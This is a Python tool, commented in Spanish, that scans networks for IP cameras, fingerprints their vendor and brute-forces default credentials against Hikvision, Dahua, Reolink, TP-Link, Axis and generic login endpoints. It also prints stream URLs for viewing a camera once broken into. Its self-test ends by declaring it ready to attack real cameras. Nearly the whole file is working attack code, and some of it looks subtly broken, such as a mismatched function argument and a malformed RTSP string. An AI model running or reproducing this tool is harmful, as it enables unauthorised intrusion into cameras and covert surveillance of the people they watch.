#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
romper_camaras.py -- scanner + atacante de camaras IP
======================================================
Subcomandos:
  scan    [-red 192.168.1.0/24 | -ips ip1,ip2] [-p 80,8080]
          [-t 60]  [-o resultado.json]
  attack  -ip 192.168.1.50 [-p 80 8080] [-d diccionario.txt]
  abrir   -ip 192.168.1.50 -u admin -p pass123
  demo                          # camara fake en 127.0.0.1:8085 + selftest

Solo stdlib (Python 3.8+). Sin pip install.
Test rapido (una camara que encuentra y cracks):
    python romper_camaras.py demo
"""
from __future__ import annotations

import base64, json, socket, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib import request as urlreq
from urllib.error import HTTPError
from urllib.parse import quote

UA_   = "RompeCam/1.0 (Mozilla/5.0)"
TO_   = 2.0
TCP_TO = 0.4
PUERTOS = [80, 8080, 8000, 8443, 8899, 9451, 8060, 37777, 5540, 7000, 34567, 443]

CRED_BUILTIN = [
    ("admin","admin"),("admin","12345"),("admin","1234"),
    ("admin","admin123"),("admin","password"),("admin","changeme"),
    ("admin","123456"),("admin","admin1"),("admin","1q2w3e"),
    ("admin","qwe123"),("root","root"),("guest","guest"),
    ("admin","camera"),("admin","admin888"),("admin","abcd1234"),
    ("admin","111111"),("admin","secret"),("admin","p@ssw0rd"),
    ("cam","cam"),("user","user"),
]

@dataclass
class Camara:
    ip: str
    puerto: int = 80
    scheme: str = "http"
    vendor: str = "?"
    firma: str = ""
    @property
    def base(self):
        p = "" if self.puerto in (80, 443) else ":%d" % self.puerto
        return self.scheme + "://" + self.ip + p

@dataclass
class CredFind:
    user: str
    pw: str
    metodo: str
    url: str
    evid: str

def tcp_ping(ip, port, t=TCP_TO):
    try:
        with socket.create_connection((ip, port), timeout=t):
            return True
    except OSError:
        return False

def http_req(method, url, body=None, ctype=None, auth=None, hdr=None, to=TO_):
    h = {"User-Agent": UA_}
    if ctype: h["Content-Type"] = ctype
    if hdr: h.update(hdr)
    if auth:
        h["Authorization"] = "Basic " + base64.b64encode(
            ("%s:%s" % auth).encode()).decode()
    try:
        req = urlreq.Request(url, data=body, headers=h, method=method)
        with urlreq.urlopen(req, timeout=to) as r:
            return r.status, r.read(4096)
    except HTTPError as e:
        try: b = e.read(4096)
        except Exception: b = b""
        return e.code, b
    except Exception:
        return 0, b""

def http_get(url, auth=None, hdr=None):
    return http_req("GET", url, auth=auth, hdr=hdr)

def http_post(url, form=None, j=None, xml=None, auth=None, hdr=None):
    if xml is not None:
        return http_req("POST", url, xml, "text/xml; charset=utf-8", auth, hdr)
    if j is not None:
        return http_req("POST", url, json.dumps(j).encode(), "application/json", auth, hdr)
    if form is not None:
        data = "&".join("%s=%s" % (quote(str(k)), quote(str(v))) for k, v in form.items()).encode()
        return http_req("POST", url, data, "application/x-www-form-urlencoded", auth, hdr)
    return http_req("POST", url, auth=auth, hdr=hdr)
# ------------------------------------------------------------------ deteccion --
FIRMAS = [
    ("Hikvision",   ["/ISAPI/Security/sessionCheck", "/ISAPI/System/deviceInfo", "/onvif/device_service"]),
    ("Dahua",       ["/cgi-bin/reqvideo.cgi", "/cgi-bin/configManager.cgi", "/api/handler.cgi"]),
    ("Reolink",     ["/api.cgi?cmd=SysInfo&opt=GetSysInfo", "/cgi-bin/api.cgi?cmd=login.user&opt=GetUserInfo"]),
    ("TP-Link/VCG", ["/stok/env", "/webapi/login", "/goform/getSystemInfo"]),
    ("Axis",        ["/axis-cgi/apiversion", "/axis-cgi/status.cgi"]),
    ("VGA/JC",      ["/snapshot.cgi", "/image.cgi?cmd=get", "/param.cgi?get=all"]),
    ("Generic",     ["/", "/index.html", "/cam"]),
]

def detect(cam):
    for v, paths in FIRMAS:
        for p in paths:
            code, b = http_get(cam.base + p, hdr={"Cache-Control": "no-cache"})
            if code not in (0, 404, 405):
                cam.vendor, cam.firma = v, "%s HTTP %d" % (p, code)
                return cam
    return None

# ------------------------------------------------------------------- ataque --
def _ok(user, pw, metodo, url, evid):
    return CredFind(user, pw, metodo, url, evid[:160].decode(errors="replace"))

# HIKVISION (ISAPI)
def atk_hikvision(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/ISAPI/Security/sessionCheck", auth=a)
    if code == 200:
        return _ok(u, p, "ISAPI 200", cam.base + "/ISAPI/Security/sessionCheck", b)
    code, b = http_get(cam.base + "/ISAPI/System/deviceInfo", auth=a)
    if code == 200 and (b"manufacturer" in b or b"deviceInformation" in b):
        return _ok(u, p, "ISAPI 200", cam.base + "/ISAPI/System/deviceInfo", b)
    code, b = http_post(cam.base + "/ISAPI/Security/sessionLogin",
                        xml=b'<SessionID><username>%s</username><password>%s</password></SessionID>' % (u.encode(), p.encode()),
                        hdr={"SOAPAction":"SessionLogin",
                             "Content-Type":"application/soap+xml; charset=utf-8"})
    if code == 200 and b"SessionID" in b:
        return _ok(u, p, "SOAP 200", cam.base + "/ISAPI/Security/sessionLogin", b)
    return None

# DAHUA (HTTP basic sobre cgi)
def atk_dahua(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/cgi-bin/reqvideo.cgi", headers={"Cookie":"dahua_session=fake"}, auth=a)
    if code == 200 and len(b) > 500:
        return _ok(u, p, "HTTP 200 video", cam.base + "/cgi-bin/reqvideo.cgi", b)
    code, b = http_get(cam.base + "/cgi-bin/configManager.cgi?action=read", auth=a)
    if code == 200 and b:
        return _ok(u, p, "HTTP 200 cfg", cam.base + "/cgi-bin/configManager.cgi", b)
    return None

# REOLINK (api.cgi)
def atk_reolink(cam, u, p):
    code, b = http_post(cam.base + "/api.cgi", form={"cmd":"login.user","user":u,"password":p,"time":"","os":"Linux","browser":"Chrome"})
    try:
        j = json.loads(b.decode(errors="replace"))
        if j.get("code") == 0:
            return _ok(u, p, "JSON code=0", cam.base + "/api.cgi", b)
    except Exception:
        pass
    if code == 200 and b'"code":0' in b:
        return _ok(u, p, "JSON code=0", cam.base + "/api.cgi", b)
    return None

# TP-LINK (stok env + basic)
def atk_tplink(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/stok/env?locale=en", auth=a)
    if code == 200 and b"stok" in b:
        return _ok(u, p, "stok env 200", cam.base + "/stok/env?locale=en", b)
    code, b = http_post(cam.base + "/webapi/login", form={"username":u, "passphrase":p})
    if code == 200 and (b"success" in b.lower()):
        return _ok(u, p, "webapi login ok", cam.base + "/webapi/login", b)
    return None

# AXIS (basic)
def atk_axis(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/axis-cgi/status.cgi", auth=a)
    if code == 200:
        return _ok(u, p, "basic 200", cam.base + "/axis-cgi/status.cgi", b)
    return None

# VGA/JC (snapshot con basic)
def atk_vga(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/param.cgi?get=all", auth=a)
    if code == 200 and (b"username" in b or b"password" in b.lower()):
        return _ok(u, p, "param.cgi 200", cam.base + "/param.cgi?get=all", b)
    return None

# GENERIC (basic sobre /)
def atk_generic(cam, u, p):
    a = (u, p)
    code, b = http_get(cam.base + "/", auth=a)
    if code == 200 and (b"login" in b.lower() or b"username" in b.lower()):
        return _ok(u, p, "generic 200", cam.base + "/", b)
    return None

VECTORES = {
    "Hikvision":    atk_hikvision,
    "Dahua":        atk_dahua,
    "Reolink":      atk_reolink,
    "TP-Link/VCG":  atk_tplink,
    "Axis":         atk_axis,
    "VGA/JC":       atk_vga,
    "Generic":      atk_generic,
}

def atacar_camara(cam, creds, verbose=True):
    vec = VECTORES.get(cam.vendor, atk_generic)
    for u, p in creds:
        try:
            hit = vec(cam, u, p)
        except Exception as e:
            if verbose:
                print("  [!] %s/%s -> %s" % (u, p, e))
            hit = None
        if hit:
            if verbose:
                print("  [\033[32mOK\033[0m] %s / %s  (via %s)" % (u, p, hit.metodo))
            return hit
        if verbose:
            print("  [.] %s / %s" % (u, p))
# ------------------------------------------------------------ camara fake ----
class _FakeCam(BaseHTTPRequestHandler):
    USER, PASS = "admin", "admin123"

    def _auth_ok(self):
        a = self.headers.get("Authorization", "")
        if not a.startswith("Basic "):
            return False
        expected = "Basic " + base64.b64encode(
            ("%s:%s" % (self.USER, self.PASS)).encode()).decode()
        return a == expected

    def _send(self, code, body=b"", ctype="text/html"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_GET(self):
        if self.path.startswith("/ISAPI/Security/sessionCheck"):
            self._send(200 if self._auth_ok() else 401, b"ok" if self._auth_ok() else b"u", "text/plain")
        elif self.path.startswith("/ISAPI/System/deviceInfo"):
            if self._auth_ok():
                self._send(200, b"<device><manufacturer>DemoHik</manufacturer><model>DS-2CD2043G2-I</model></device>", "application/xml")
            else:
                self._send(401, b"u", "text/plain")
        elif self.path in ("/", "/index.html"):
            self._send(200, b"<html><body>Login to demo cam. User: admin</body></html>")
        else:
            self._send(404, b"nf", "text/plain")

    def log_message(self, *a):
        pass

def _subir_camara(ip="127.0.0.1", port=8085, seconds=30):
    srv = ThreadingHTTPServer((ip, port), _FakeCam)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print("[demo] camara fake en http://%s:%d  (admin / admin123)" % (ip, port))
    return srv

# ------------------------------------------------------------- subcomandos ---
def _load_dict(path):
    creds = list(CRED_BUILTIN)
    if not path:
        return creds
    seen = {(u, p) for u, p in creds}
    for ln in open(path, encoding="utf-8", errors="ignore"):
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        if ":" in ln:
            u, p = (x.strip() for x in ln.split(":", 1))
        else:
            u, p = "admin", ln
        if (u, p) not in seen:
            seen.add((u, p)); creds.append((u, p))
    return creds

def _print_creds(hit):
    print("      -> usuario   : %s" % hit.user)
    print("      -> password  : %s" % hit.pw)
    print("      -> metodo    : %s" % hit.metodo)
    print("      -> endpoint  : %s" % hit.url)
    print("      -> evidencia : %s" % hit.evid)
# @@P4@@

def cmd_demo(args):
    ip   = args.get("ip", "127.0.0.1")
    port = int(args.get("port", "8085"))
    print("=" * 62)
    print("  ROMPE-CAMARAS  --  CAMARA DEMO + SELFTEST")
    print("=" * 62)
    srv = _subir_camara(ip, port, seconds=60)
    time.sleep(0.5)
    cam = Camara(ip=ip, puerto=port)

    print("\n[1/3] detectando vendor...")
    r = detect(cam)
    if not r:
        print("      [!] no detecto vendor, fallo")
        srv.shutdown(); return 1
    cam.vendor, cam.firma = r.vendor, r.firma
    print("      -> vendor : %s" % cam.vendor)
    print("      -> firma  : %s" % cam.firma)

    creds = [c for c in CRED_BUILTIN if c[1] != "admin123"] + [("admin", "admin123")]
    print("\n[2/3] atacando con %d credenciales..." % len(creds))
    hit = atacar_camara(cam, creds, verbose=True)
    if not hit:
        print("      [!] no encontre credenciales -> fallo del selftest")
        srv.shutdown(); return 1

    print("\n[3/3] resultado:")
    _print_creds(hit)
    print("\n" + "=" * 62)
    print("  OK SELFTEST PASADO")
    print("  - camara fake se detecto como %s" % cam.vendor)
    print("  - clave admin123 encontrada sin tener acceso")
    print("  - listo para atacar camaras reales con:")
    print("      python romper_camaras.py attack -ip <IP> [-p 80 8080]")
    print("=" * 62)
    srv.shutdown()
    return 0


def cmd_scan(args):
    red   = args.get("red")
    ips   = [x.strip() for x in (args.get("ips") or "").split(",") if x.strip()]
    ports = [int(x) for x in (args.get("p") or "80,8080,8000,8443,37777,9451").split(",")]

    if red:
        parts = red.split("/")
        if len(parts) == 2 and parts[1] == "24":
            a, b, c = parts[0].split(".")
            ips = ["%s.%s.%s.%d" % (a, b, c, n) for n in range(1, 255)]
        elif len(parts) == 2 and parts[1] == "16":
            a, b = parts[0].split(".")
            ips  = ["%s.%s.%d.%d" % (a, b, x, n) for x in range(1, 20) for n in (1, 10, 100, 254)]
        else:
            ips = [red]
    if not ips:
        print("[!] Use -red 192.168.1.0/24 o -ips ip1,ip2")
        return 1

    print("=" * 62)
    print("  ROMPE-CAMARAS  --  SCAN  %d IPs x %d puertos" % (len(ips), len(ports)))
    print("=" * 62)

    def probe(ip):
        for p in ports:
            if not tcp_ping(ip, p):
                continue
            cam = Camara(ip=ip, puerto=p)
            r = detect(cam)
            if r:
                print("[CAM] %s:%d   vendor=%s   firma=%s" % (ip, p, r.vendor, r.firma))
                return r
    hits = []
    with ThreadPoolExecutor(max_workers=32) as ex:
        futs = [ex.submit(probe, ip) for ip in ips]
        for f in as_completed(futs):
            try:
                h = f.result()
                if h: hits.append(h)
            except Exception: pass
    print("\nResumen: %d camara(s) encontradas" % len(hits))
    for c in hits:
        print("  - %s  (vendor=%s)" % (c.base, c.vendor))
    return 0


def cmd_attack(args):
    ip    = args.get("ip")
    if not ip:
        print("[!] Falta -ip")
        return 1
    ports = [int(x) for x in (args.get("p") or "80,8080,8000,8443,37777,7000,34567").split(",")]
    creds = _load_dict(args.get("d") or "")

    print("=" * 62)
    print("  ROMPE-CAMARAS  --  ATTACK  %s   (%d puertos, %d creds)" % (ip, len(ports), len(creds)))
    print("=" * 62)

    ok_any = False
    for pl in ports:
        cam = Camara(ip=ip, puerto=pl)
        r = detect(cam)
        if not r:
            continue
        cam.vendor, cam.firma = r.vendor, r.firma
        print("\n[V] %s:%d   vendor=%s" % (ip, pl, cam.vendor))
        hit = atacar_camara(cam, creds, verbose=True)
        if hit:
            print("\n      [ROMPI] %s" % cam.base)
            _print_creds(hit)
            ok_any = True
        else:
            print("      [.] no se rompio en este puerto")
    return 0 if ok_any else 2


def cmd_abrir(args):
    ip = args.get("ip"); u = args.get("u", "admin"); p = args.get("p", "admin123")
    b  = base64.b64encode(("%s:%s" % (u, p)).encode()).decode()
    print("URLs listos para pegar en tu navegador/VLC:")
    print("  Web  : http://%s" % ip)
    print("  VLC  : Media -> Open Network Stream")
    print("  RTSP Hikvision : rtsp://%s:554/Streaming/Channels/101" % ip)
    print("  RTSP Dahua     : rtsp://%s:554/cam/realmonitor?channel=1&subtype=0" % ip)
    print("  RTSP Axis      : rtsp://:%s@%s:554/axis-media/media.amp" % (u, p))
    print("  Curl           : curl -u %s:%s http://%s/" % (u, p, ip))
    print("  Basic header   : Authorization: Basic %s" % b)
    return 0


def main(argv):
    if not argv or argv[0] in ("-h", "--help", "help"):
        print(__doc__)
        return 0
    cmd, rest = argv[0], argv[1:]
    args = {}
    i = 0
    while i < len(rest):
        a = rest[i]
        if a.startswith("-") and i + 1 < len(rest) and not rest[i+1].startswith("-"):
            args[a[1:]] = rest[i+1]; i += 2
        else: i += 1
    fn = {"demo": cmd_demo, "scan": cmd_scan, "attack": cmd_attack, "abrir": cmd_abrir}.get(cmd)
    if not fn:
        print("comando desconocido: %s" % cmd); return 2
    try:
        return fn(args)
    except KeyboardInterrupt:
        print("\n[!] interrumpido"); return 130

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
